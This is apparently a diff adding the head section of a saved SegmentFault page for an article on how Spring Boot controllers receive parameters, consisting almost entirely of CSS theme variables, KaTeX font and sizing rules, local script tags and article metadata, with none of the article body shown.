+  --VC-BG-COLOR-ACTIVE: #282828;
+  --VC-WARN-BG: #332700;
+  --VC-WARN-BORDER: #664e00;
+  --VC-ERROR-BG: #321010;
+  --VC-ERROR-BORDER: #642020;
+  --VC-DOM-TAG-NAME-COLOR: #5DB0D7;
+  --VC-DOM-ATTRIBUTE-NAME-COLOR: #9BBBDC;
+  --VC-DOM-ATTRIBUTE-VALUE-COLOR: #f29766;
+  --VC-CODE-KEY-FG: #e36eec;
+  --VC-CODE-PRIVATE-KEY-FG: #f4c5f7;
+  --VC-CODE-FUNC-FG: #556af2;
+  --VC-CODE-NUMBER-FG: #9980ff;
+  --VC-CODE-STR-FG: #e93f3b;
+  --VC-CODE-NULL-FG: #808080;
+}
+</style><style>/* color */
+.vcelm-node {
+  color: var(--VC-DOM-TAG-NAME-COLOR);
+}
+.vcelm-k {
+  color: var(--VC-DOM-ATTRIBUTE-NAME-COLOR);
+}
+.vcelm-v {
+  color: var(--VC-DOM-ATTRIBUTE-VALUE-COLOR);
+}
+/* layout */
+.vcelm-l {
+  padding-left: 8px;
+  position: relative;
+  word-wrap: break-word;
+  line-height: 1;
+}
+/*.vcelm-l.vcelm-noc {
+  padding-left: 0;
+}*/
+.vcelm-l.vc-toggle > .vcelm-node {
+  display: block;
+}
+.vcelm-l .vcelm-node:active {
+  background-color: var(--VC-BG-COLOR-ACTIVE);
+}
+.vcelm-l.vcelm-noc .vcelm-node:active {
+  background-color: transparent;
+}
+.vcelm-t {
+  white-space: pre-wrap;
+  word-wrap: break-word;
+}
+/* level */
+.vcelm-l .vcelm-l {
+  display: none;
+}
+.vcelm-l.vc-toggle > .vcelm-l {
+  margin-left: 4px;
+  display: block;
+}
+/* arrow */
+.vcelm-l:before {
+  content: "";
+  display: block;
+  position: absolute;
+  top: 6px;
+  left: 3px;
+  width: 0;
+  height: 0;
+  border: transparent solid 3px;
+  border-left-color: var(--VC-FG-1);
+}
+.vcelm-l.vc-toggle:before {
+  display: block;
+  top: 6px;
+  left: 0;
+  border-top-color: var(--VC-FG-1);
+  border-left-color: transparent;
+}
+.vcelm-l.vcelm-noc:before {
+  display: none;
+}
+</style><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/vendorslayouts__indexp__Area__GDS-2020p__Area__Gromorep__Area.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/vendorslayouts__indexp__ArticleDetailp__Blogsp__DianpingDetai.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/vendorslayouts__index.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/layouts__indexp__Live__Addp__Video__Addp__Write.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/layouts__index.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/2.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/vendorsp__ArticleDetailp__DianpingDetailp__Livep__QuestionDet.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/p__ArticleDetail.js"></script><script async="true" defer="true" data-domain="segmentfault.com" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/plausible.js" data-react-helmet="true"></script><script type="application/ld+json" data-react-helmet="true">{
+            "@context": "https://schema.org",
+            "@type": "Article",
+            "mainEntityOfPage": {
+              "@type": "WebPage",
+              "@id": "https://google.com/article"
+            },
+            "name": "spring-boot-route（一）Controller接收参数的几种方式",
+            "headline": "spring-boot-route（一）Controller接收参数的几种方式",
+            "image": "https://cdn.segmentfault.com/r-13dae9d9/touch-icon.png",
+            "datePublished": "2020-10-02T11:30:55.000Z",
+            "dateModified": "2021-05-08T02:48:42.000Z",
+            "url": "https://segmentfault.com/a/1190000025188239",
+            "author": {
+              "@type": "Person",
+              "name": "Java旅途"
+            },
+            "publisher": {
+              "@type": "Organization",
+              "name": "SegmentFault",
+              "logo": {
+                "@type": "ImageObject",
+                "url":
+                  "https://assets.segmentfault.com/v-5fc4b0b2/global/img/static/touch-icon.png"
+              }
+            }
+          }</script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/70.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/71.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/72.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/59.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/68.js"></script><link rel="stylesheet" type="text/css" href="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/7.css"><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/7.js"></script><script charset="utf-8" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/8.js"></script><script src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/katexCssLoader.js"></script><style type="text/css">
+/* stylelint-disable font-family-no-missing-generic-family-keyword */
+@font-face {
+  font-family: 'KaTeX_AMS';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_AMS-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_AMS-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_AMS-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Caligraphic';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Caligraphic-Bold.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Caligraphic-Bold.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Caligraphic-Bold.ttf) format('truetype');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Caligraphic';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Caligraphic-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Caligraphic-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Caligraphic-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Fraktur';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Fraktur-Bold.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Fraktur-Bold.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Fraktur-Bold.ttf) format('truetype');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Fraktur';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Fraktur-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Fraktur-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Fraktur-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Main';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Bold.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Bold.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Bold.ttf) format('truetype');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Main';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-BoldItalic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-BoldItalic.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-BoldItalic.ttf) format('truetype');
+  font-weight: bold;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_Main';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Italic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Italic.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Italic.ttf) format('truetype');
+  font-weight: normal;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_Main';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Main-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Math';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Math-BoldItalic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Math-BoldItalic.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Math-BoldItalic.ttf) format('truetype');
+  font-weight: bold;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_Math';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Math-Italic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Math-Italic.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Math-Italic.ttf) format('truetype');
+  font-weight: normal;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_SansSerif';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Bold.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Bold.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Bold.ttf) format('truetype');
+  font-weight: bold;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_SansSerif';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Italic.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Italic.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Italic.ttf) format('truetype');
+  font-weight: normal;
+  font-style: italic;
+}
+@font-face {
+  font-family: 'KaTeX_SansSerif';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_SansSerif-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Script';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Script-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Script-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Script-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Size1';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size1-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size1-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size1-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Size2';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size2-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size2-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size2-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Size3';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size3-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size3-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size3-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Size4';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size4-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size4-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Size4-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'KaTeX_Typewriter';
+  src: url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Typewriter-Regular.woff2) format('woff2'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Typewriter-Regular.woff) format('woff'), url(https://cdn.segmentfault.com/r-13dae9d9/fonts/katex/KaTeX_Typewriter-Regular.ttf) format('truetype');
+  font-weight: normal;
+  font-style: normal;
+}
+.katex {
+  font: normal 1.21em KaTeX_Main, Times New Roman, serif;
+  line-height: 1.2;
+  text-indent: 0;
+  text-rendering: auto;
+  border-color: currentColor;
+}
+.katex * {
+  -ms-high-contrast-adjust: none !important;
+}
+.katex .katex-version::after {
+  content: "0.12.0";
+}
+.katex .katex-mathml {
+  position: absolute;
+  clip: rect(1px, 1px, 1px, 1px);
+  padding: 0;
+  border: 0;
+  height: 1px;
+  width: 1px;
+  overflow: hidden;
+}
+.katex .katex-html {
+  /* 
+ewline is an empty block at top level, between .base elements */
+}
+.katex .katex-html > .newline {
+  display: block;
+}
+.katex .base {
+  position: relative;
+  display: inline-block;
+  white-space: nowrap;
+  width: min-content;
+}
+.katex .strut {
+  display: inline-block;
+}
+.katex .textbf {
+  font-weight: bold;
+}
+.katex .textit {
+  font-style: italic;
+}
+.katex .textrm {
+  font-family: KaTeX_Main;
+}
+.katex .textsf {
+  font-family: KaTeX_SansSerif;
+}
+.katex .texttt {
+  font-family: KaTeX_Typewriter;
+}
+.katex .mathnormal {
+  font-family: KaTeX_Math;
+  font-style: italic;
+}
+.katex .mathit {
+  font-family: KaTeX_Main;
+  font-style: italic;
+}
+.katex .mathrm {
+  font-style: normal;
+}
+.katex .mathbf {
+  font-family: KaTeX_Main;
+  font-weight: bold;
+}
+.katex .boldsymbol {
+  font-family: KaTeX_Math;
+  font-weight: bold;
+  font-style: italic;
+}
+.katex .amsrm {
+  font-family: KaTeX_AMS;
+}
+.katex .mathbb,
+.katex .textbb {
+  font-family: KaTeX_AMS;
+}
+.katex .mathcal {
+  font-family: KaTeX_Caligraphic;
+}
+.katex .mathfrak,
+.katex .textfrak {
+  font-family: KaTeX_Fraktur;
+}
+.katex .mathtt {
+  font-family: KaTeX_Typewriter;
+}
+.katex .mathscr,
+.katex .textscr {
+  font-family: KaTeX_Script;
+}
+.katex .mathsf,
+.katex .textsf {
+  font-family: KaTeX_SansSerif;
+}
+.katex .mathboldsf,
+.katex .textboldsf {
+  font-family: KaTeX_SansSerif;
+  font-weight: bold;
+}
+.katex .mathitsf,
+.katex .textitsf {
+  font-family: KaTeX_SansSerif;
+  font-style: italic;
+}
+.katex .mainrm {
+  font-family: KaTeX_Main;
+  font-style: normal;
+}
+.katex .vlist-t {
+  display: inline-table;
+  table-layout: fixed;
+  border-collapse: collapse;
+}
+.katex .vlist-r {
+  display: table-row;
+}
+.katex .vlist {
+  display: table-cell;
+  vertical-align: bottom;
+  position: relative;
+}
+.katex .vlist > span {
+  display: block;
+  height: 0;
+  position: relative;
+}
+.katex .vlist > span > span {
+  display: inline-block;
+}
+.katex .vlist > span > .pstrut {
+  overflow: hidden;
+  width: 0;
+}
+.katex .vlist-t2 {
+  margin-right: -2px;
+}
+.katex .vlist-s {
+  display: table-cell;
+  vertical-align: bottom;
+  font-size: 1px;
+  width: 2px;
+  min-width: 2px;
+}
+.katex .vbox {
+  display: -ms-inline-flexbox;
+  display: inline-flex;
+  -ms-flex-direction: column;
+  flex-direction: column;
+  align-items: baseline;
+}
+.katex .hbox {
+  display: -ms-inline-flexbox;
+  display: inline-flex;
+  -ms-flex-direction: row;
+  flex-direction: row;
+  width: 100%;
+}
+.katex .thinbox {
+  display: inline-flex;
+  flex-direction: row;
+  width: 0;
+  max-width: 0;
+}
+.katex .msupsub {
+  text-align: left;
+}
+.katex .mfrac > span > span {
+  text-align: center;
+}
+.katex .mfrac .frac-line {
+  display: inline-block;
+  width: 100%;
+  border-bottom-style: solid;
+}
+.katex .mfrac .frac-line,
+.katex .overline .overline-line,
+.katex .underline .underline-line,
+.katex .hline,
+.katex .hdashline,
+.katex .rule {
+  min-height: 1px;
+}
+.katex .mspace {
+  display: inline-block;
+}
+.katex .llap,
+.katex .rlap,
+.katex .clap {
+  width: 0;
+  position: relative;
+}
+.katex .llap > .inner,
+.katex .rlap > .inner,
+.katex .clap > .inner {
+  position: absolute;
+}
+.katex .llap > .fix,
+.katex .rlap > .fix,
+.katex .clap > .fix {
+  display: inline-block;
+}
+.katex .llap > .inner {
+  right: 0;
+}
+.katex .rlap > .inner,
+.katex .clap > .inner {
+  left: 0;
+}
+.katex .clap > .inner > span {
+  margin-left: -50%;
+  margin-right: 50%;
+}
+.katex .rule {
+  display: inline-block;
+  border: solid 0;
+  position: relative;
+}
+.katex .overline .overline-line,
+.katex .underline .underline-line,
+.katex .hline {
+  display: inline-block;
+  width: 100%;
+  border-bottom-style: solid;
+}
+.katex .hdashline {
+  display: inline-block;
+  width: 100%;
+  border-bottom-style: dashed;
+}
+.katex .sqrt > .root {
+  margin-left: 0.27777778em;
+  margin-right: -0.55555556em;
+}
+.katex .sizing.reset-size1.size1,
+.katex .fontsize-ensurer.reset-size1.size1 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size1.size2,
+.katex .fontsize-ensurer.reset-size1.size2 {
+  font-size: 1.2em;
+}
+.katex .sizing.reset-size1.size3,
+.katex .fontsize-ensurer.reset-size1.size3 {
+  font-size: 1.4em;
+}
+.katex .sizing.reset-size1.size4,
+.katex .fontsize-ensurer.reset-size1.size4 {
+  font-size: 1.6em;
+}
+.katex .sizing.reset-size1.size5,
+.katex .fontsize-ensurer.reset-size1.size5 {
+  font-size: 1.8em;
+}
+.katex .sizing.reset-size1.size6,
+.katex .fontsize-ensurer.reset-size1.size6 {
+  font-size: 2em;
+}
+.katex .sizing.reset-size1.size7,
+.katex .fontsize-ensurer.reset-size1.size7 {
+  font-size: 2.4em;
+}
+.katex .sizing.reset-size1.size8,
+.katex .fontsize-ensurer.reset-size1.size8 {
+  font-size: 2.88em;
+}
+.katex .sizing.reset-size1.size9,
+.katex .fontsize-ensurer.reset-size1.size9 {
+  font-size: 3.456em;
+}
+.katex .sizing.reset-size1.size10,
+.katex .fontsize-ensurer.reset-size1.size10 {
+  font-size: 4.148em;
+}
+.katex .sizing.reset-size1.size11,
+.katex .fontsize-ensurer.reset-size1.size11 {
+  font-size: 4.976em;
+}
+.katex .sizing.reset-size2.size1,
+.katex .fontsize-ensurer.reset-size2.size1 {
+  font-size: 0.83333333em;
+}
+.katex .sizing.reset-size2.size2,
+.katex .fontsize-ensurer.reset-size2.size2 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size2.size3,
+.katex .fontsize-ensurer.reset-size2.size3 {
+  font-size: 1.16666667em;
+}
+.katex .sizing.reset-size2.size4,
+.katex .fontsize-ensurer.reset-size2.size4 {
+  font-size: 1.33333333em;
+}
+.katex .sizing.reset-size2.size5,
+.katex .fontsize-ensurer.reset-size2.size5 {
+  font-size: 1.5em;
+}
+.katex .sizing.reset-size2.size6,
+.katex .fontsize-ensurer.reset-size2.size6 {
+  font-size: 1.66666667em;
+}
+.katex .sizing.reset-size2.size7,
+.katex .fontsize-ensurer.reset-size2.size7 {
+  font-size: 2em;
+}
+.katex .sizing.reset-size2.size8,
+.katex .fontsize-ensurer.reset-size2.size8 {
+  font-size: 2.4em;
+}
+.katex .sizing.reset-size2.size9,
+.katex .fontsize-ensurer.reset-size2.size9 {
+  font-size: 2.88em;
+}
+.katex .sizing.reset-size2.size10,
+.katex .fontsize-ensurer.reset-size2.size10 {
+  font-size: 3.45666667em;
+}
+.katex .sizing.reset-size2.size11,
+.katex .fontsize-ensurer.reset-size2.size11 {
+  font-size: 4.14666667em;
+}
+.katex .sizing.reset-size3.size1,
+.katex .fontsize-ensurer.reset-size3.size1 {
+  font-size: 0.71428571em;
+}
+.katex .sizing.reset-size3.size2,
+.katex .fontsize-ensurer.reset-size3.size2 {
+  font-size: 0.85714286em;
+}
+.katex .sizing.reset-size3.size3,
+.katex .fontsize-ensurer.reset-size3.size3 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size3.size4,
+.katex .fontsize-ensurer.reset-size3.size4 {
+  font-size: 1.14285714em;
+}
+.katex .sizing.reset-size3.size5,
+.katex .fontsize-ensurer.reset-size3.size5 {
+  font-size: 1.28571429em;
+}
+.katex .sizing.reset-size3.size6,
+.katex .fontsize-ensurer.reset-size3.size6 {
+  font-size: 1.42857143em;
+}
+.katex .sizing.reset-size3.size7,
+.katex .fontsize-ensurer.reset-size3.size7 {
+  font-size: 1.71428571em;
+}
+.katex .sizing.reset-size3.size8,
+.katex .fontsize-ensurer.reset-size3.size8 {
+  font-size: 2.05714286em;
+}
+.katex .sizing.reset-size3.size9,
+.katex .fontsize-ensurer.reset-size3.size9 {
+  font-size: 2.46857143em;
+}
+.katex .sizing.reset-size3.size10,
+.katex .fontsize-ensurer.reset-size3.size10 {
+  font-size: 2.96285714em;
+}
+.katex .sizing.reset-size3.size11,
+.katex .fontsize-ensurer.reset-size3.size11 {
+  font-size: 3.55428571em;
+}
+.katex .sizing.reset-size4.size1,
+.katex .fontsize-ensurer.reset-size4.size1 {
+  font-size: 0.625em;
+}
+.katex .sizing.reset-size4.size2,
+.katex .fontsize-ensurer.reset-size4.size2 {
+  font-size: 0.75em;
+}
+.katex .sizing.reset-size4.size3,
+.katex .fontsize-ensurer.reset-size4.size3 {
+  font-size: 0.875em;
+}
+.katex .sizing.reset-size4.size4,
+.katex .fontsize-ensurer.reset-size4.size4 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size4.size5,
+.katex .fontsize-ensurer.reset-size4.size5 {
+  font-size: 1.125em;
+}
+.katex .sizing.reset-size4.size6,
+.katex .fontsize-ensurer.reset-size4.size6 {
+  font-size: 1.25em;
+}
+.katex .sizing.reset-size4.size7,
+.katex .fontsize-ensurer.reset-size4.size7 {
+  font-size: 1.5em;
+}
+.katex .sizing.reset-size4.size8,
+.katex .fontsize-ensurer.reset-size4.size8 {
+  font-size: 1.8em;
+}
+.katex .sizing.reset-size4.size9,
+.katex .fontsize-ensurer.reset-size4.size9 {
+  font-size: 2.16em;
+}
+.katex .sizing.reset-size4.size10,
+.katex .fontsize-ensurer.reset-size4.size10 {
+  font-size: 2.5925em;
+}
+.katex .sizing.reset-size4.size11,
+.katex .fontsize-ensurer.reset-size4.size11 {
+  font-size: 3.11em;
+}
+.katex .sizing.reset-size5.size1,
+.katex .fontsize-ensurer.reset-size5.size1 {
+  font-size: 0.55555556em;
+}
+.katex .sizing.reset-size5.size2,
+.katex .fontsize-ensurer.reset-size5.size2 {
+  font-size: 0.66666667em;
+}
+.katex .sizing.reset-size5.size3,
+.katex .fontsize-ensurer.reset-size5.size3 {
+  font-size: 0.77777778em;
+}
+.katex .sizing.reset-size5.size4,
+.katex .fontsize-ensurer.reset-size5.size4 {
+  font-size: 0.88888889em;
+}
+.katex .sizing.reset-size5.size5,
+.katex .fontsize-ensurer.reset-size5.size5 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size5.size6,
+.katex .fontsize-ensurer.reset-size5.size6 {
+  font-size: 1.11111111em;
+}
+.katex .sizing.reset-size5.size7,
+.katex .fontsize-ensurer.reset-size5.size7 {
+  font-size: 1.33333333em;
+}
+.katex .sizing.reset-size5.size8,
+.katex .fontsize-ensurer.reset-size5.size8 {
+  font-size: 1.6em;
+}
+.katex .sizing.reset-size5.size9,
+.katex .fontsize-ensurer.reset-size5.size9 {
+  font-size: 1.92em;
+}
+.katex .sizing.reset-size5.size10,
+.katex .fontsize-ensurer.reset-size5.size10 {
+  font-size: 2.30444444em;
+}
+.katex .sizing.reset-size5.size11,
+.katex .fontsize-ensurer.reset-size5.size11 {
+  font-size: 2.76444444em;
+}
+.katex .sizing.reset-size6.size1,
+.katex .fontsize-ensurer.reset-size6.size1 {
+  font-size: 0.5em;
+}
+.katex .sizing.reset-size6.size2,
+.katex .fontsize-ensurer.reset-size6.size2 {
+  font-size: 0.6em;
+}
+.katex .sizing.reset-size6.size3,
